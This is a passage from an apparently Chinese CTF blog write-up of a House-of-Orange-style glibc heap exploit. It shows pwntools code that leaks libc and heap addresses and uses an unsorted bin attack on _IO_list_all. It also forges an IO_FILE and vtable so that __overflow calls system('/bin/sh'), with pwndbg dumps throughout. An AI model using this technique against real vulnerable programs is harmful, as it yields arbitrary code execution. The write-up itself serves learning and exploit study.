   &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>



<p>成功malloc(0x400)后填充’C’ * 8 的堆数据如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx 0x5555557580c0</span><br><span class="line">0x5555557580c0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x5555557580d0:	0x4343434343434343	0x00007ffff7dd2188 <span class="comment"># main_arena + 88</span></span><br><span class="line">0x5555557580e0:	0x00005555557580c0	0x00005555557580c0 <span class="comment"># self heap addr</span></span><br></pre></td></tr></table></figure>



<p>利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc base with overflow</span></span><br><span class="line">ad(<span class="number">0x400</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">dp()</span><br><span class="line">lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - main_arena - <span class="number">1640</span></span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># leak heap addr with large bin</span></span><br><span class="line">md(<span class="number">0x10</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dp()</span><br><span class="line">ru(<span class="string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>)</span><br><span class="line">heap = u64(ru(<span class="string">&#x27;\x0a&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0xc0</span></span><br><span class="line">li(<span class="string">&#x27;heap &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>



<h3 id="触发异常劫持控制流程"><a href="#触发异常劫持控制流程" class="headerlink" title="触发异常劫持控制流程"></a>触发异常劫持控制流程</h3><p>怎么触发呢? 只要破坏unsorted bin 链表结构,再次申请时就会触发异常,那触发异常就会打印错误信息,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数，而 malloc_printerr<code>其实是调用</code> <code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>, 然后根据<code>IO_list_all</code>中的值去遍历IO_FILE调用IO_FILE 的vtable中的 <code>__overflow</code>函数指针</p>
<h3 id="unsorted-bin-attack-修改-IO-list-all"><a href="#unsorted-bin-attack-修改-IO-list-all" class="headerlink" title="unsorted bin attack 修改 _IO_list_all"></a>unsorted bin attack 修改 <code>_IO_list_all</code></h3><p>如何进行劫持,采用修改old top chunk 的结构,使之报错,然而我们只需要采用unsorted bin attack修改<code>_IO_list_all</code>的值为unsorted_chunks(av)也就是main_arena + 0x58.修改这个有什么用? 本来<code>_IO_list_all</code>的值是指向<code>_IO_2_1_stderr</code>,若修改这个值,那么在malloc报错的时候就会遍历<code>_IO_list_all</code> 指向的IO_FILE结构体，详细后面会说道.</p>
<p>unsorted bin attack 实现攻击源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">               victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">               (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">               ....</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">           unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">           bck-&gt;fd                 = unsorted_chunks(av); <span class="comment">//实现想目标处修改值</span></span><br></pre></td></tr></table></figure>



<p>实现修改如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx &amp;_IO_list_all</span><br><span class="line">0x7ffff7dd2520 &lt;_IO_list_all&gt;:	0x00007ffff7dd1b78	0x0000000000000000</span><br><span class="line">0x7ffff7dd2530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:	0x00000000fbad2086	0x0000000000000000</span><br><span class="line">0x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd2560 &lt;_IO_2_1_stderr_+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x /10gx 0x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b78 &lt;main_arena+88&gt;:	0x000055555577a010	0x00005555557584f0</span><br><span class="line">0x7ffff7dd1b88 &lt;main_arena+104&gt;:	0x00005555557584f0	0x00007ffff7dd2510</span><br><span class="line">0x7ffff7dd1b98 &lt;main_arena+120&gt;:	0x00007ffff7dd1b88	0x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba8 &lt;main_arena+136&gt;:	0x00007ffff7dd1b98	0x00007ffff7dd1b98</span><br><span class="line">0x7ffff7dd1bb8 &lt;main_arena+152&gt;:	0x00007ffff7dd1ba8	0x00007ffff7dd1ba8</span><br></pre></td></tr></table></figure>



<p>利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Control program</span></span><br><span class="line">p = <span class="string">&#x27;B&#x27;</span> * <span class="number">0x400</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0x21</span>)</span><br><span class="line">p += <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake file</span></span><br><span class="line">f = p64(<span class="number">0</span>)		   <span class="comment"># old top chunk prev_size</span></span><br><span class="line">f += p64(<span class="number">0x100</span>)    <span class="comment"># old top chunk size</span></span><br><span class="line">f += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsoted bin attack实现修改 _IO_list_all</span></span><br></pre></td></tr></table></figure>



<h3 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h3><p>若下次申请大小为0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;= 2*SIZE_SZ，就会触发malloc_printerr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,<span class="comment">// 执行该函数</span></span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br></pre></td></tr></table></figure>



<p>那么在执行malloc_printerr函数就会执行到<code>_IO_flush_all_lockp</code>, 来了解一下<code>_IO_flush_all_lockp</code> 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">   <span class="comment">//循环遍历IO_FILE,采用 fp-&gt;chain来进行获取下一个IO_FILE, 那么</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      <span class="comment">//check, 在后面伪造的IO_FILE中需要绕过,然后执行 _IO_OVERFLOW (fp, EOF) == EOF)</span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) <span class="comment">//参数传入IO_FILE的地址和EOF</span></span><br><span class="line">        result = EOF;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>_IO_flush_all_lockp</code>函数中会根据<code>_IO_list_all</code>中的值,依次遍历IO_FILE,那我们就想法设法构建自己的IO_FILE,若IO_FILE满足fp-&gt;<code>_mode</code> &lt;= 0 &amp;&amp; fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 然后会调用vtable中的<code>__overflow</code> 函数,我们就可以伪造一个vtable,实现在调用<code>__overflow</code>的时候调用我们的函数</p>
<p>来了解一下IO_FILE_plus结构体.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> （<span class="title">size_of</span>=</span><span class="number">0x78</span>+<span class="number">0x8</span>）</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">//储存下一个IO_FILE的地址,这是关键,后面采用一种方法实现main_arena + 88的IO_FILE结构体的这个值指向我们所构造的fake IO_FILE</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>vtable表中结构</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow); //后面通过伪造IO_FILE使 会调用此函数指针,就修改这个为system</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="comment">#if 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>后面就将这个<code>__overflow</code> 修改为system, 然而在调用这些函数指针的时候,传入的参数是IO_FILE的地址,所以后面我们需要在自己伪造的IO_FILE的头部填入’/bin/sh\x00’,若能使<code>_IO_flush_all_lockp</code>函数在遍历的时候遍历到我们伪造的IO_FILE,且IO_FILE满足<code>_IO_overflow</code>函数的调用条件, 这样就能实现get shell,那么怎样才能让我们伪造的IO_FILE连接到我们自己伪造的IO_FILE呢? </p>
<p>那使用unsorted bin attack修改<code>_IO_list_all</code>中main_arena + 0x58,后面就要得修改main_arena + 0x58处fkae IO_FILE的 chain为我们的fake IO_FILE地址,这样在执行<code>_IO_flush_all_lockp</code>就会根据自己伪造的IO_FILE调用我们所伪造的vtable函数了.但关键是怎样使<code>_IO_flush_all_lockp</code> 在遍历 IO_FILE的时候能遍历到我们伪造的IO_FILE,就要靠下面的操作了.</p>
<h3 id="修改main-arena-fake-file中的chain-指向我们即将伪造的IO-FILE"><a href="#修改main-arena-fake-file中的chain-指向我们即将伪造的IO-FILE" class="headerlink" title="修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE"></a>修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE</h3><p>上面的<code>_chain</code> 的值是我们重点要如何在main_arena + 0x58处IO_FILE中设置这个值为咱们可以掌控的fake IO_FILE地址,然而unsorted bin的链表结构已经被破坏,再次申请的时候,old top chunk就不受unsorted bin 管理,注意若大小小于0x400 的bin的管理顺序为unsorted bin -&gt; small bin,若我们修改old top chunk size 为小于0x400,就可以让当前chunk受small bin进行管理,而在small bin管理的时候, 各个大小的bin的链表头部地址会储存在main_arena中,若我们想要实现修改 main_arena + 0x58处 IO_FILE中的 <code>_chain</code>的值,就需要靠small bin的管理机制来进行修改</p>
<pre><code> 若我们能够计算好大小,就能实现在main_arena部分内存中储存我们的chunk地址.下面为修改old top chunk大小为0x50所看到main_arena + 0x58中IO_FILE的结构</code></pre>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)((long int)&amp;main_arena + 0x58))</span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1433903120, </span><br><span class="line">    _IO_read_ptr = 0x5555557584f0 <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_end = 0x5555557584f0 <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="string">&quot;\360\204uUUU&quot;</span>, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="string">&quot;\360\204uUUU&quot;</span>, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="string">&quot;\210\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="string">&quot;\210\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="string">&quot;\230\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="string">&quot;\230\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_backup_base = 0x5555557584f0 <span class="string">&quot;/bin/sh&quot;</span>, <span class="comment"># 这是small bin管理时,储存我们的堆地址</span></span><br><span class="line">    _IO_save_end = 0x5555557584f0 <span class="string">&quot;/bin/sh&quot;</span>,    <span class="comment"># 这是small bin管理时,储存我们的堆地址</span></span><br><span class="line">    _markers = 0x7ffff7dd1bc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _chain = 0x7ffff7dd1bc8 &lt;main_arena+168&gt;,  <span class="comment"># 下一个IO_FILE的地址,这是我们想要覆盖当前地址为old top chunk addr</span></span><br><span class="line">    _fileno = 